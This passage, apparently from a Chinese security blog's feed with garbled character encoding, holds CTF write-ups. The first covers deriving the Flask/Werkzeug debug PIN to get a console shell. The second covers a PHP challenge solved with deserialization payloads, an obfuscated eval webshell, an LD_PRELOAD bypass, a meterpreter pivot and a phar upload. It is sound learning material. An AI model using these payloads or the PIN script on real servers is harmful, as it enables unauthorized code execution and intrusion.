the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        getattr(app, <span class="string">"__name__"</span>, app.__class__.__name__),</span><br><span class="line">        getattr(mod, <span class="string">"__file__"</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [str(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, text_type):</span><br><span class="line">            bit = bit.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b"cookiesalt"</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">"__wzd"</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don't</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b"pinsalt"</span>)</span><br><span class="line">        num = (<span class="string">"%09d"</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don't have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">"-"</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">"0"</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä»ç¬¬äºŒä¸ªå‡½æ•°å¾—çŸ¥ï¼Œç”Ÿæˆ <code>Flask Debug PIN</code> å…±éœ€è¦å…­ä¸ªå‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username  # å½“å‰ç”¨æˆ·çš„ç”¨æˆ·å</span><br><span class="line">modname  # flask</span><br><span class="line">getattr(app, &quot;__name__&quot;, app.__class__.__name__)  # Flask.app</span><br><span class="line">getattr(mod, &quot;__file__&quot;, None)  # flask ä¸­ app.py æ‰€åœ¨ç›®å½•ï¼Œå¯ä»æŠ¥é”™ä¿¡æ¯ä¸­è¯»åˆ°ï¼Œä¸€èˆ¬ä¸º pythonæ‰€åœ¨ç›®å½•&#x2F;Lib&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br><span class="line">str(uuid.getnode())  # ç½‘å¡ MAC åœ°å€çš„åè¿›åˆ¶è¡¨ç¤ºï¼ŒLinux å¯é€šè¿‡è¯»å– &#96;&#x2F;sys&#x2F;class&#x2F;net&#x2F;ç½‘å¡åç§°ï¼ˆä¸€èˆ¬ä¸º eth0 ï¼Œè™šæ‹Ÿæœºä¸º ens33ï¼‰&#x2F;address&#96; è·å¾— MAC åœ°å€</span><br><span class="line">get_machine_id()  # ä¸åŒç¯å¢ƒè¯»å–ä¸åŒæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>åªéœ€è·å–åˆ°è¿™å…­ä¸ªå‚æ•°ï¼Œå°±èƒ½ç”Ÿæˆ PIN ï¼Œä»è€Œ getshell ï¼Œå…¶ä¸­ <code>machine_id</code> ç”±ç¬¬ä¸€ä¸ªå‡½æ•°è·å–ï¼Œéœ€è¦æ³¨æ„å¯¹åº”çš„ç¯å¢ƒè¯»å–ä¸åŒçš„æ–‡ä»¶</p><h2 id="0x03-åˆ©ç”¨è¿‡ç¨‹"><a href="#0x03-åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="0x03 åˆ©ç”¨è¿‡ç¨‹"></a>0x03 åˆ©ç”¨è¿‡ç¨‹</h2><p>è¿™é‡Œæƒ³è¦åˆ©ç”¨ <code>Flask Debug PIN</code> ï¼Œéœ€è¦é…åˆä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ä½¿ç”¨ï¼ŒåŸé¢˜ä¸­ä½¿ç”¨äº† urllib åº“ï¼Œå¯ä»¥é€šè¿‡ file åè®®è¯»å–æ–‡ä»¶ï¼Œè·å–å¯¹åº”å‚æ•°ï¼Œå†ä»ä¸Šæ–¹ç¬¬äºŒä¸ªå‡½æ•°ä¸­æå– PIN çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œæ„æˆå¦‚ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'username'</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,  <span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'pythonæ‰€åœ¨ç›®å½•/Lib/site-packages/flask/app.py'</span>  <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'MAC åœ°å€åè¿›åˆ¶è¡¨ç¤º'</span>,  <span class="comment"># str(uuid.getnode())ï¼Œ/sys/class/net/ç½‘å¡åç§°/address</span></span><br><span class="line">    <span class="string">'machine_id'</span>  <span class="comment"># get_machine_id()</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>é€šè¿‡è„šæœ¬ç”Ÿæˆ PIN ï¼Œåœ¨æŠ¥é”™ç•Œé¢ä¸­è¾“å…¥å³å¯è·å– Python console ï¼Œå†é€šè¿‡ <code>os.popen(&#39;xxx&#39;).readlines()</code> å‡½æ•°å³å¯ getshell</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æ­¤åˆ©ç”¨è¿‡ç¨‹ç•¥æ˜¾é¸¡è‚‹ï¼Œä½†å¯¹ Flask çš„ Debug æ¨¡å¼ å’Œ Flask Debug PIN æœ‰äº†å¤§è‡´äº†è§£ï¼Œå¯ä»¥åœ¨ä»¥åçš„å­¦ä¹ è¿‡ç¨‹ä¸­åŠ ä»¥åˆ©ç”¨ï¼Œè¾¾åˆ°æ›´å¥½çš„æ•ˆæœ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¸Šå‘¨æ‰“å—é‚®çš„ NCTF æ—¶ç¢°åˆ°äº†ä¸€é“åä¸º flask_website çš„é¢˜ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä½†
      
    
    </summary>
    
    
      <category term="WEB" scheme="https://x5tar.com/categories/WEB/"/>
    
    
      <category term="WEBå®‰å…¨" scheme="https://x5tar.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
      <category term="Flask" scheme="https://x5tar.com/tags/Flask/"/>
    
      <category term="å­¦ä¹ " scheme="https://x5tar.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CNSS Recruit 2019 Web Bossé¢˜ WriteUp</title>
    <link href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web-boss/"/>
    <id>https://x5tar.com/2019/10/24/cnss-recruit-2019-web-boss/</id>
    <published>2019-10-24T15:18:36.000Z</published>
    <updated>2020-02-18T13:49:37.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-åæ§½æ€è€ƒ-for-BOSS-Get-Me-Inside"><a href="#0x00-åæ§½æ€è€ƒ-for-BOSS-Get-Me-Inside" class="headerlink" title="0x00 åæ§½æ€è€ƒ for [BOSS] Get Me Inside"></a>0x00 <del>åæ§½</del>æ€è€ƒ for [BOSS] Get Me Inside</h2><p>è¿™é“é¢˜è‚çš„æ˜¯çœŸçš„çˆ½ï¼Œä» ddl å‰ä¸€å¤©æ™šä¸Šå¼€å§‹ï¼Œæåˆ° ddl å½“å¤©å‡Œæ™¨å››ç‚¹å¤š<del>ï¼ˆåŸæ¥æˆ‘çš„è‚è¿™ä¹ˆå¥½ï¼‰</del><br>è¿™æ˜¯ä¸€é“æ¶‰åŠé¢å¹¿æ³›çš„é¢˜ï¼Œè€ƒè™‘åˆ°äº†å®æˆ˜çš„ä¸€äº›æƒ…å†µï¼Œè€ƒå¯Ÿå¤šæ–¹é¢çš„çŸ¥è¯†ï¼Œæ˜¯ä¸€é“ä¸å¯å¤šå¾—çš„å¥½é¢˜ï¼ˆå³ä½¿å¦‚æ­¤ï¼Œæˆ‘ä¾æ—§æƒ³æš´æ‰“å„ä½å‡ºé¢˜äººemmmï¼‰</p><h2 id="0x01-ååºåˆ—åŒ–æ¼æ´"><a href="#0x01-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="0x01 ååºåˆ—åŒ–æ¼æ´"></a>0x01 ååºåˆ—åŒ–æ¼æ´</h2><p>æ‰“å¼€è¿™é“é¢˜é¦–å…ˆå°±æ˜¯ä¸€å † PHP æºç ï¼Œç›´æ¥å°±æ‘†ä¸Šäº†ä¸€å¤§å † <code>class</code> ï¼Œå…ˆæš‚æ—¶ç•¥è¿‡è¿™äº› <code>class</code> ï¼Œç»§ç»­å‘ä¸‹çœ‹ï¼Œæˆ‘ä»¬ä¼šå‘ç°åœ¨æºç çš„æœ«å°¾æœ‰è¿™ä¹ˆä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'p'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="keyword">if</span>($flag === <span class="number">1</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šè¾¹çš„ä¸€å¤§å † <code>class</code> ï¼Œè€ƒè™‘åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œå±‚å±‚é€’è¿›ï¼Œæœ€ç»ˆå°†å˜é‡ <code>flag</code> çš„å€¼è®¾ä¸º <code>1</code> å³å¯ï¼Œæ•…æ„é€ ä»¥ä¸‹ payload ï¼ˆè¿™é‡Œå¯ä»¥ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œç„¶åè‡ªå·±å†™ä¸€ä¸ªè„šæœ¬æŠŠéœ€è¦çš„å˜é‡åºåˆ—åŒ–ä¸€ä¸‹å³å¯ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?p&#x3D;O:4:&quot;Deep&quot;:2:&#123;s:2:&quot;m1&quot;;O:4:&quot;Dark&quot;:2:&#123;s:2:&quot;m1&quot;;O:7:&quot;Fantasy&quot;:2:&#123;s:2:&quot;m1&quot;;O:5:&quot;Happy&quot;:2:&#123;s:2:&quot;m1&quot;;O:8:&quot;New_year&quot;:2:&#123;s:2:&quot;s1&quot;;O:21:&quot;Copied_from_somewhere&quot;:0:&#123;&#125;s:2:&quot;s2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;s:2:&quot;m2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥åå‘ç°åœ¨æœªæä¾›å‚æ•° <code>c</code> çš„æƒ…å†µä¸‹è¾“å‡ºäº† <code>?</code> ï¼Œå¯çŸ¥æˆåŠŸå°† <code>flag</code> è®¾ä¸º <code>1</code></p><h2 id="0x02-get-shell"><a href="#0x02-get-shell" class="headerlink" title="0x02 get shell"></a>0x02 get shell</h2><p>ä¹‹åæŸ¥çœ‹æœ€åçš„ä¸€æ®µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'c'</span>];</span><br><span class="line"> <span class="keyword">if</span>(strlen($code)&gt;<span class="number">37</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"è¿™ä¹ˆé•¿ä¼šæ­»çš„!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9^!]+/"</span>,$code))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Catch you!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è€ƒè™‘é€šè¿‡ <code>eval</code> è¿™ä¸ªå‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°æ‹¿åˆ°ç³»ç»Ÿ shell ï¼Œç„¶è€Œé¦–å…ˆè¦é¢å¯¹çš„é—®é¢˜å°±æ˜¯è¿™ä¸ªå¯æ¶çš„æ­£åˆ™ï¼Œä½ æ³¨å…¥çš„ä»£ç ä¸­ä¸èƒ½åŒ…å«ä»»ä½•å­—æ¯ã€æ•°å­—å’Œ <code>^</code> <code>!</code> ä¸¤ç§ç¬¦å·<br>è¿™é‡Œå¯ä»¥ä½¿ç”¨ PHP çš„å¦ä¸€ç§å‡½æ•°è°ƒç”¨æ–¹å¼ <code>(å‡½æ•°å)(å‚æ•°)</code> ï¼Œç„¶åå‡½æ•°åå’Œå‚æ•°éƒ½é‡‡ç”¨æŒ‰ä½å–åçš„æ–¹å¼ï¼Œé€šè¿‡urlç¼–ç å’Œ <code>~</code> è¿ç®—ç¬¦è°ƒç”¨å‡½æ•°<br>ç„¶åæˆ‘ä»¬éå¸¸é«˜å…´çš„æ‰§è¡Œäº† <code>system(&#39;whoami&#39;)</code> ï¼Œä½†æ˜¯ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿï¼Œçœ‹ä¸€ä¸‹ <code>phpinfo()</code> ï¼Œå‘ç°å‡ ä¹æ‰€æœ‰èƒ½æ‹¿åˆ°ç³»ç»Ÿshellçš„å‡½æ•°éƒ½åœ¨ <code>disable_functions</code> é‡Œï¼Œç„¶åè€ƒè™‘ç»•è¿‡ <code>disable_functions</code> çš„æ–¹æ³•ï¼Œç»è¿‡å¤šæ–¹æŸ¥æ‰¾ï¼Œæœ€åé€‰æ‹©äº†é€šè¿‡ <code>LD_PRELOAD</code> çš„æ–¹å¼ç»•è¿‡ï¼Œä½†è¿™ç§æ–¹æ³•éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥ç»§ç»­æ„é€  payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?p&#x3D;O:4:%22Deep%22:2:&#123;s:2:%22m1%22;O:4:%22Dark%22:2:&#123;s:2:%22m1%22;O:7:%22Fantasy%22:2:&#123;s:2:%22m1%22;O:5:%22Happy%22:2:&#123;s:2:%22m1%22;O:8:%22New_year%22:2:&#123;s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:&#123;&#125;s:2:%22s2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;s:2:%22m2%22;N;&#125;&amp;c&#x3D;(~%9e%8c%8c%9a%8d%8b)($&#123;~%a0%b8%ba%ab&#125;[%aa]);&amp;%aa&#x3D;eval($_POST[&#39;aaa&#39;]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å¦ä¸€ä¸ªå¯ä»¥æ‰§è¡Œ PHP è¯­å¥çš„å‡½æ•° <code>assert</code> ï¼Œä½†ç”±äº <code>assert</code> ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­å†åŠ å…¥ä¸€ä¸ª <code>eval</code> ï¼Œè¿™é‡Œä¾¿å‡ºç°äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„ä¸€å¥è¯æœ¨é©¬ï¼ŒäºŒè¯ä¸è¯´æ‰”åˆ°èšå‰‘é‡Œï¼Œå‘ç° shell ä¾ç„¶æ— æ³•ä½¿ç”¨ï¼Œä½†å¯ä»¥è¯»å–å’Œä¸Šä¼ æ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯å› ä¸ºè¯»å–å’Œä¸Šä¼ æ–‡ä»¶å¯ä»¥ç”¨ PHP è‡ªå¸¦çš„å…¶å®ƒå‡½æ•°å®ç°ï¼Œæ‰€ä»¥ä¸éœ€è¦æ‹¿åˆ° shell å°±å¯ä»¥ï¼‰ï¼Œç”±äº hint å‘Šè¯‰æˆ‘ä»¬å¯¹ <code>html</code> ç›®å½•æ²¡æœ‰å†™æƒé™ï¼Œæ•…è€ƒè™‘å¦ä¸€ä¸ªç›®å½• <code>/tmp</code> ï¼Œæµ‹è¯•åå‘ç°æœ‰å†™æƒé™ï¼Œæ•…å¯ä»¥ä¸Šä¼ æ„é€ çš„ <code>so</code> æ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼ˆä½†å½“æ—¶æœåŠ¡å™¨é‡Œæœ‰ä¸çŸ¥å“ªä½å¥½å¿ƒçš„å¤§å“¥ç•™ä¸‹çš„ <code>so</code> æ–‡ä»¶ï¼Œæˆ‘å°±ç›´æ¥æ‹¿æ¥ç”¨äº†ï¼Œåæ¥çŸ¥é“é‚£ä¸ªæ–‡ä»¶<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">å‡ºè‡ªæ­¤å¤„</a>ï¼Œè¿™ä¸ªæ„é€ çš„ååˆ†å·§å¦™ï¼Œä½¿ç”¨äº†å¦ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œé…åˆ PHP å®ç°ä¸€æ¬¡ç¼–è¯‘å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ— éœ€æ¯æ¬¡ä¿®æ”¹å‘½ä»¤éƒ½è¦é‡æ–°ç¼–è¯‘ï¼Œå­¦åˆ°äº†)ï¼Œç„¶å <code>include</code> ä¸€ä¸‹é…å¥—çš„ PHP æ–‡ä»¶ï¼ŒæŒ‰ç…§ PHP é‡Œçš„å‚æ•°é…ç½®ä¸€ä¸‹ï¼ŒæˆåŠŸæ‹¿åˆ°ç³»ç»Ÿshell</p><h2 id="0x03-å†…ç½‘ç©¿é€"><a href="#0x03-å†…ç½‘ç©¿é€" class="headerlink" title="0x03 å†…ç½‘ç©¿é€"></a>0x03 å†…ç½‘ç©¿é€</h2><p>ç”±äº hint ç»™å‡ºäº† <code>LAN &amp; ARP</code> ï¼Œè¿™é‡Œè€ƒè™‘ flag å¯èƒ½å­˜åœ¨äºå¦ä¸€å°æœåŠ¡å™¨ï¼ˆè®°ä¸ºæœåŠ¡å™¨2ï¼‰ä¸Šï¼Œç”¨ <code>arp -a</code> çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰è¿™ä¹ˆä¸€ä¸ª IP ä¸ä¼—ä¸åŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0</span><br></pre></td></tr></table></figure><p><code>curl</code> çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªç½‘é¡µå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè€ƒè™‘å°†æœåŠ¡å™¨2çš„80ç«¯å£è½¬å‘å‡ºæ¥ï¼Œå¯ä»¥é‡‡ç”¨ msf çš„ <code>meterpreter</code> æ¨¡å—ï¼ˆè¿™é‡Œéœ€è¦è‡ªå·±æœ‰ä¸€ä¸ªå…¬ç½‘ IP ï¼Œæˆ‘é€‰æ‹©å¼€äº†ä¸€ä¸ª VPS ï¼Œä¸€èˆ¬æ¥è¯´å†å°† VPS ç«¯å£è½¬å‘åˆ°æœ¬åœ°æ¯”è¾ƒå®‰å…¨ï¼Œä½†æˆ‘ä¸ºäº†æ–¹ä¾¿ç›´æ¥åœ¨ VPS ä¸Šè£…äº†ä¸ª msf ï¼Œæ¯•ç«Ÿç”¨å®Œå³åˆ ï¼‰<br>å…ˆç”¨ <code>msfvenom</code> åšä¸ªæœ¨é©¬ï¼Œç„¶åç”¨èšå‰‘ä¸Šä¼ åˆ°æœåŠ¡å™¨1ï¼Œç»™ä¸€ä¸‹æ‰§è¡Œæƒé™ï¼Œæ¥ä¸‹æ¥åœ¨ <code>msfconsole</code> ä¸­ç›‘å¬æœ¨é©¬è®¾ç½®çš„ç«¯å£ï¼Œç„¶åå†æœåŠ¡å™¨1ä¸­è¿è¡Œæœ¨é©¬ï¼Œæ‹¿åˆ° <code>meterpreter shell</code>ï¼Œç„¶åç”¨ <code>portfwd</code> è¿›è¡Œç«¯å£è½¬å‘ï¼Œæ‰“å¼€è½¬å‘åˆ°æœåŠ¡å™¨ä¸Šçš„ç«¯å£ï¼ŒæˆåŠŸæ‰“å¼€æœåŠ¡å™¨2ä¸Šçš„ç½‘é¡µ</p><h2 id="0x04-get-shell-Again"><a href="#0x04-get-shell-Again" class="headerlink" title="0x04 get shell Again"></a>0x04 get shell <strong>Again</strong></h2><p>æ‰“å¼€é¡µé¢ï¼Œå‘ç°ä¼¼ä¹å¯ä»¥ä¸Šä¼ ä»€ä¹ˆä¸œè¥¿ï¼Œè§‚å¯Ÿ url æœ‰ <code>/?file=index</code> ï¼Œç‚¹å‡»ä¸Šä¼ å url å˜åŒ–ä½†é¡µé¢å¹¶æœªå˜åŒ–ï¼Œå°è¯•å»æ‰æœ€åçš„ <code>.php</code> ï¼Œå‘ç°æˆåŠŸæ‰“å¼€ä¸Šä¼ é¡µé¢ï¼Œå¯ä»¥åˆ¤æ–­ <code>file</code> æ˜¯ä¸€ä¸ª <code>include</code> æ¼æ´ï¼Œå°è¯• <code>phpä¼ªåè®®</code> è¯»å–æºç ï¼Œæ„é€ ä»¥ä¸‹ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»åˆ° <code>upload.php</code> çš„æºç ï¼ˆæˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™çš„ç¡®è¯»åˆ°äº†æºç ï¼Œä½†å†æ¬¡å°è¯•å´å‘ç°è¯»ä¸åˆ°äº†QAQï¼‰<br>è§‚å¯Ÿä¸Šä¼ é¡µé¢ï¼Œå‘ç°å¹¶æ— è¡¨å•å¯ä»¥æäº¤ï¼Œå°±åœ¨æœ¬åœ°å†™ä¸€ä¸ªè¡¨å•æäº¤åˆ°æœåŠ¡å™¨2ï¼Œå°è¯•å‘ç°åªèƒ½ä¸Šä¼  png æ–‡ä»¶ï¼Œç”±äº hint æŒ‡å‡ºäº† <code>Phar</code> ï¼Œäºæ˜¯å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œæ‰“åŒ…æˆ <code>zip</code>ï¼ˆæ³¨æ„æ‰“åŒ…æ—¶é€‰æ‹©ä¸å‹ç¼©ï¼‰ï¼Œç„¶åå°†æ‹“å±•åæ”¹ä¸º <code>png</code> ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå¾—åˆ°ä¸Šä¼ åçš„æ–‡ä»¶åï¼Œæ„é€ ä»¥ä¸‹ payloadï¼ˆæ³¨æ„æœ€åçš„æœ¨é©¬åä¸éœ€è¦ <code>.php</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;phar:&#x2F;&#x2F;pic&#x2F;æ–‡ä»¶å&#x2F;æœ¨é©¬å</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ <code>phpinfo</code> ï¼Œå‘ç°æ‹¿ shell 